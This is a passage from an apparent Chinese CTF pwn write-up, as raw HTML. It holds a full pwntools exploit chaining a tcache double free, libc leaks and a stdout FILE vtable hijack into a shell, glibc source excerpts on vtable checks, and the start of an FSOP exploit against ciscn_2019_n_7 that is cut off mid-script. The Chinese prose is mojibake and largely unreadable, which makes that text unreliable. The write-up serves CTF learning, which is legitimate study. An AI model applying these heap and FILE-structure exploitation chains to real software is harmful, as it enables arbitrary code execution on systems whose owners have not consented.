class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./vn_pwn_easyTHeap&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,26233)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./vn_pwn_easyTHeap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># tcache double free</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx0</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx1</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the heap base</span></span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    heap_base = heap_leak - <span class="number">0x260</span></span><br><span class="line">    log.info(<span class="string">&#x27;heap base leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning, hijack the tcache struct</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx2</span></span><br><span class="line">    edit(<span class="number">2</span>, p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx3</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx4, our fake chunk</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">b&quot;\x07&quot;</span>.rjust(<span class="number">0x10</span>, <span class="string">b&quot;\x07&quot;</span>)) <span class="comment"># all full</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc base</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the fake file structure</span></span><br><span class="line">    fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFBAD2886</span>) <span class="comment"># _flags, an magic word, we need to (0xFBAD2887 &amp; (~0x1)) to clear the _IO_USER_BUF flag to pass the check in _IO_str_finish</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">131</span>) * <span class="number">7</span> <span class="comment"># from _IO_read_ptr to _IO_buf_base</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">132</span>) <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">4</span> <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]) <span class="comment"># the FILE chain ptr</span></span><br><span class="line">    fake_file += p32(<span class="number">1</span>) <span class="comment"># _fileno for stdout is 1</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># _flags2, usually 0</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _old_offset, -1</span></span><br><span class="line">    fake_file += p16(<span class="number">0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\x00&quot;</span> <span class="comment"># _vtable_offset</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\n&quot;</span> <span class="comment"># _shortbuf[1]</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># padding</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x1e20</span>) <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _offset, -1</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0xe20</span>) <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">    fake_file += p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode, -1</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span> <span class="comment"># _unused2</span></span><br><span class="line">    fake_file = fake_file.ljust(<span class="number">0xD8</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># adjust to vtable</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] + <span class="number">0xc0</span> - <span class="number">0x28</span>) + p64(<span class="number">0</span>) + p64(libc_base + one_gadget) <span class="comment"># set the vtable to _IO_str_jumps - 0x28 and set the _IO_2_1_stdout_ + 0xe8 to one_gadget</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning, hijack the _IO_2_1_stdout and its vtable</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">b&quot;\x10&quot;</span>.rjust(<span class="number">0x10</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(<span class="number">0</span>) * <span class="number">21</span> + p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx5, our fake chunk</span></span><br><span class="line">    edit(<span class="number">5</span>, fake_file)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯get shell</p><p><img src="https://i.loli.net/2021/01/28/pOolNzjyAbwJTFR.png" alt="image.png"></p><blockquote><h4 id="IO-FILE-plusç»“æ„ä½“ä¸­-vtable-ç›¸å¯¹åç§»"><a href="#IO-FILE-plusç»“æ„ä½“ä¸­-vtable-ç›¸å¯¹åç§»" class="headerlink" title="_IO_FILE_plusç»“æ„ä½“ä¸­ vtable ç›¸å¯¹åç§»"></a>_IO_FILE_plusç»“æ„ä½“ä¸­ vtable ç›¸å¯¹åç§»</h4><blockquote><p> åœ¨ libc2.23 ç‰ˆæœ¬ä¸‹ï¼Œ32 ä½çš„ vtable åç§»ä¸º 0x94ï¼Œ64 ä½åç§»ä¸º 0xd8 </p><p> <a href="https://ctf-wiki.org/pwn/linux/io_file/introduction/">ctf-wiki: FILE structure</a></p></blockquote><h4 id="vtable-åˆæ³•æ€§æ£€æµ‹-start-from-glibc2-24"><a href="#vtable-åˆæ³•æ€§æ£€æµ‹-start-from-glibc2-24" class="headerlink" title="vtable åˆæ³•æ€§æ£€æµ‹(start from glibc2.24)"></a>vtable åˆæ³•æ€§æ£€æµ‹(start from glibc2.24)</h4><p>è‡ªä»glibc2.24ç‰ˆæœ¬èµ·ä¾¿å¢åŠ äº†å¯¹äºvtableçš„æ£€æµ‹ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">section.  */</span></span><br><span class="line"><span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line"><span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line"><span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line"><span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment"> slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">_IO_vtable_check ();</span><br><span class="line"><span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gdbè°ƒè¯•å¯çŸ¥è¿™ä¸ªsection_lengthçš„é•¿åº¦ä¸º3432ï¼ˆ0xd68ï¼‰ï¼š</p><p><img src="https://i.loli.net/2021/01/26/1P62e8KHUgOCR5i.png" alt="image.png"></p><p>ç”±æ­¤ï¼Œæˆ‘ä»¬æ‰€æ„é€ çš„fake vtableçš„ä½ç½®å—åˆ°äº†ä¸€å®šçš„é™åˆ¶ï¼Œå³åªèƒ½åœ¨<code>__start___libc_IO_vtables</code>å¾€å0xd68å­—èŠ‚çš„èŒƒå›´å†…</p><h4 id="vtableè¡¨åŠ«æŒå§¿åŠ¿-under-glibc2-28"><a href="#vtableè¡¨åŠ«æŒå§¿åŠ¿-under-glibc2-28" class="headerlink" title="vtableè¡¨åŠ«æŒå§¿åŠ¿(under glibc2.28)"></a>vtableè¡¨åŠ«æŒå§¿åŠ¿(under glibc2.28)</h4><p>åœ¨glibc2.28å¾€å‰çš„ç‰ˆæœ¬ä¸­<strong>_IO_str_finishå‡½æ•°ä¼šå°†_IO_2_1_stdout_ + 0xE8çš„ä½ç½®ä½œä¸ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæ‰§è¡Œ</strong>ï¼Œæ•…æˆ‘ä»¬é€šå¸¸è€ƒè™‘åœ¨è¿™ä¸ªä½ç½®æ”¾ä¸Šæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„æŒ‡ä»¤åœ°å€ï¼ˆå¦‚one_gadgetï¼‰å¹¶å°†vtableè¡¨åŠ«æŒåˆ°é€‚åˆçš„ä½ç½®ä»¥æ‰§è¡Œ<code>_IO_str_finish()</code>å‡½æ•°</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è€ƒè™‘<strong>åŠ«æŒ_IO_2_1_stdout_å¹¶ä¿®æ”¹å…¶vtableè¡¨è‡³è¡¨_IO_str_jumpsé™„è¿‘</strong>ï¼Œè¯¥vtableè¡¨å®šä¹‰äºlibio&#x2F;sstrops.cä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">JUMP_INIT_DUMMY,</span><br><span class="line">JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">JUMP_INIT(read, _IO_default_read),</span><br><span class="line">JUMP_INIT(write, _IO_default_write),</span><br><span class="line">JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">JUMP_INIT(close, _IO_default_close),</span><br><span class="line">JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¸éš¾çœ‹å‡ºï¼Œåœ¨<strong>è¯¥è¡¨ä¸­æœ‰æˆ‘ä»¬æ‰€éœ€çš„_IO_str_finishå‡½æ•°ï¼Œä¸”è¯¥è¡¨æœ¬èº«ä¾¿æ˜¯vtableè¡¨åˆ—è¡¨ä¸­çš„ä¸€ä¸ªè¡¨</strong>ï¼Œèƒ½å¾ˆå¥½åœ°é€šè¿‡vtableè¡¨åˆæ³•æ€§æ£€æµ‹ï¼Œå› æ­¤æˆ‘ä»¬åŠ«æŒstdoutæ—¶ä¾¿å°å°†fake vtableåŠ«æŒåˆ°è¯¥è¡¨é™„è¿‘</p><p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯æˆ‘ä»¬éœ€è¦<strong>ä¿®æ”¹_IO_2_1_stdoutçš„flagçš„æœ€åä¸€ä½ä¸º0ä»¥é€šè¿‡_IO_str_finishå‡½æ•°ä¸­çš„æ£€æµ‹</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * libio/strops.c</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line"> (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">_IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * libio.h</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF          0x0001 <span class="comment">/* Don&#x27;t deallocate buffer on close. */</span></span></span><br></pre></td></tr></table></figure><p>64ä½ä¸‹å…¶ä¼š<strong>å°†fp + 0d8 + 0x10çš„ä½ç½®ä½œä¸ºå‡½æ•°æŒ‡é’ˆè¿›è¡Œè°ƒç”¨</strong></p><p><img src="https://i.loli.net/2021/01/28/8xEXo4kUA5Z9JMu.png" alt="image.png"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯<strong>è¿™ç§åˆ©ç”¨æ–¹å¼ä»…é€‚ç”¨äºglibc2.28ä»¥ä¸‹çš„ç‰ˆæœ¬ï¼Œè‡ªglibc2.28å§‹è¯¥æ®µä»£ç è¢«ä¿®æ”¹ï¼Œæ— æ³•å†é€šè¿‡åŒç§æ–¹å¼è¿›è¡Œåˆ©ç”¨</strong></p><p>è‡ªglibc2.28å§‹ï¼Œè¯¥å‡½æ•°<strong>ä¸ä¼šè°ƒç”¨é¢å¤–çš„å‡½æ•°æŒ‡é’ˆ</strong>ï¼Œè€Œæ˜¯ä¼š<code>ç›´æ¥ä½¿ç”¨free()</code>ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line"> <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">_IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç±»ä¼¼åœ°ï¼Œ<strong>å¯¹äº_IO_str_overflowçš„åˆ©ç”¨è‡ªglibc2.28å§‹åŒæ ·å¤±æ•ˆ</strong>ï¼Œæºç æ¯”è¾ƒé•¿å°±ä¸åœ¨è¿™é‡Œè´´å‡ºäº†</p><p>å‚è€ƒï¼š<a href="https://ctf-wiki.org/pwn/linux/io_file/exploit-in-libc2.24/#_io_str_jumps-finish">ctf-wiki: exploit in libc2.24</a></p></blockquote><h4 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h4><p>FSOPå³ File Stream Oriented Programmeâ€”â€”æ–‡ä»¶æµå¯¼å‘ç¼–ç¨‹ï¼Œå…¶æ ¸å¿ƒæ€æƒ³ä¾¿æ˜¯é€šè¿‡åŠ«æŒæ–‡ä»¶æµçš„ç›¸å…³æµç¨‹ä»¥è¾¾åˆ°æ§åˆ¶ç¨‹åºæ‰§è¡Œæµçš„ç›®çš„</p><h5 id="ä¾‹é¢˜ï¼šciscn-2019-n-7-exit-hook-hijact-one-gadget-FSOP"><a href="#ä¾‹é¢˜ï¼šciscn-2019-n-7-exit-hook-hijact-one-gadget-FSOP" class="headerlink" title="ä¾‹é¢˜ï¼šciscn_2019_n_7 -  exit_hook hijact + one_gadget | FSOP"></a>ä¾‹é¢˜ï¼šciscn_2019_n_7 -  exit_hook hijact + one_gadget | FSOP</h5><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿  æŠ¤  å…¨  å¼€ï¼ˆå™”  å™”  å’š</p><p><img src="https://i.loli.net/2021/01/28/eBdwI7PSxn3ypCO.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå¯çŸ¥è¯¥ç¨‹åºæœ‰ç€åˆ†é…ã€ç¼–è¾‘ã€æ‰“å°å †å—çš„åŠŸèƒ½</p><p>ä½†æ˜¯æˆ‘ä»¬<strong>ä»…èƒ½å¤Ÿåˆ†é…ä¸€ä¸ªå †å—ï¼Œä¸”æ— æ³•é‡Šæ”¾å †å—</strong></p><p><img src="https://i.loli.net/2021/01/28/9aomlHGesxkAqrF.png" alt="image.png"></p><p>æ¼æ´ç‚¹åœ¨äºåˆ›å»º&#x2F;ç¼–è¾‘å †å—æ—¶è¾“å…¥ä½œè€…å§“åæ—¶<strong>å­˜åœ¨æº¢å‡ºï¼Œå¯ä»¥è¦†å†™æ‰ä¸å…¶ç›¸é‚»çš„å †å—æŒ‡é’ˆ</strong>ï¼Œåœ¨æ¥ä¸‹æ¥çš„ç¼–è¾‘ä¸­æˆ‘ä»¬ä¾¿å¯ä»¥<strong>å®ç°ä»»æ„åœ°å€å†™</strong></p><p><img src="https://i.loli.net/2021/01/28/Lq7cFMxUl6ytRiG.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/01/28/HnhJeRX21OWp5Mq.png" alt="image.png"></p><p>åŒæ—¶ï¼Œ<strong>è¾“å…¥666åˆ™å¯ç›´æ¥æ³„éœ²libcåœ°å€</strong></p><p><img src="https://i.loli.net/2021/01/28/D3g5PRshQfFxVy6.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/01/28/hUdkKbNwqr2WZap.png" alt="image.png"></p><p>ç”±äºglibc2.23ä¸­æœªåŠ å…¥å¯¹vtableè¡¨çš„åˆæ³•æ€§æ£€æµ‹ï¼Œæ•…æˆ‘ä»¬å¯ä»¥è€ƒè™‘ç›´æ¥åŠ«æŒ<code>_IO_2_1_stderr_</code>åŠå…¶vtableè¡¨æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>ä»¥get shellï¼ˆstderrä¸ºFILEé“¾è¡¨çš„å¤´ç»“ç‚¹ï¼‰ï¼Œå…¶ä¸­ç”±äº<code>__overflow()</code>å‡½æ•°ä¼šå°†æŒ‡å‘FILEçš„æŒ‡é’ˆä½œä¸ºå…¶ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ•…è€ƒè™‘å°†â€&#x2F;bin&#x2F;shâ€å­—ç¬¦ä¸²æ„é€ äºfake fileçš„å¼€å¤´</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_7&#x27;</span>)<span class="comment">#remote(&#x27;node3.buuoj.cn&#x27;, 26348)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)<span class="comment">#ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">one_gadget = <span class="number">0xf1147</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>((p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>)), <span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your choice-&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Input string Length: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x100</span>).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Author name:&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;arttnba3&#x27;</span> + p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh\x00&quot;</span> <span class="comment"># _flags, an magic number</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_read_ptr</span></span><br><span 